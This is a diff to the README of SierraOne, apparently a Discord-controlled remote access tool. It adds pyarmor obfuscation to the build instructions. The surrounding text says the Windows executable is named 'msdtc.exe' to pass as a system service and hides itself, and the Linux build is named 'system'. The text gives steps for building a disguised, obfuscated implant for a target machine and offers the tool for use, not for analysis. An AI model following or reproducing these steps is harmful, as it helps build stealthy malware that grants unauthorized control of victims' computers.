@@ -17,20 +17,20 @@ Not available. Instead, refer to [building](#building) to build an executable fo
 #### Linux
 ```
 $ sudo apt install python3-pip
-$ pip3 install -r requirements.txt
+$ sudo pip3 install -r requirements.txt
 $ python3 SierraOne.py
 ```
 
 ### Building
-To build an executable:
+To build an obfuscated executable:
 
 ```
 $ sudo apt install python3-pip winbind wine winetricks
 $ wget https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe
 $ wine python-3.8.2-amd64.exe
-$ pip3 install -r requirements.txt
+$ sudo pip3 install -r requirements.txt
 $ wine pip install -r wine_requirements.txt
-$ python3 builder.py -o <TARGET SYSTEM>
+$ ./builder.py -o <TARGET SYSTEM>
 ```
 
 #### **BE SURE TO ADD PYTHON TO PATH WHEN INSTALLING WITH WINE**
@@ -38,16 +38,18 @@ $ python3 builder.py -o <TARGET SYSTEM>
 The following commands will setup Wine with 64 bit Python 3.8.2 on your system. `<TARGET SYSTEM>` can be either 
 `Windows` or `Linux`. After building the executable, check the `dist` folder for your exectuable.
 
-For example, running `python3 builder.py -o Linux` on a 64 bit Linux will generate a 64 bit executable. Same logic 
-applies for `-o Windows`. If you want to generate a 32 bit executable, you'd have to install 32 bit Python instead of 
-64 bit (on your Linux and/or Wine).
+For example, running `./builder.py -o Linux` on a 64 bit Linux will generate a 64 bit obfuscated executable. Same 
+logic applies for `-o Windows`. If you want to generate a 32 bit obfuscated executable, you'd have to install 32 bit 
+Python instead of 64 bit (on your Linux and/or Wine).
+
+Both executables will be obfuscated using `pyarmor`.
 
 If built for Windows:
 - The executable's name will be `msdtc.exe`
 - Executable will automatically minimize and hide itself
 
 If built for Linux:
-- The executable's name will be `system`.
+- The executable's name will be `system`
 
 ## Configuration
 To use `SierraOne`, create a new server or be a part of a Discord server where you are an admin. Afterwards go to 
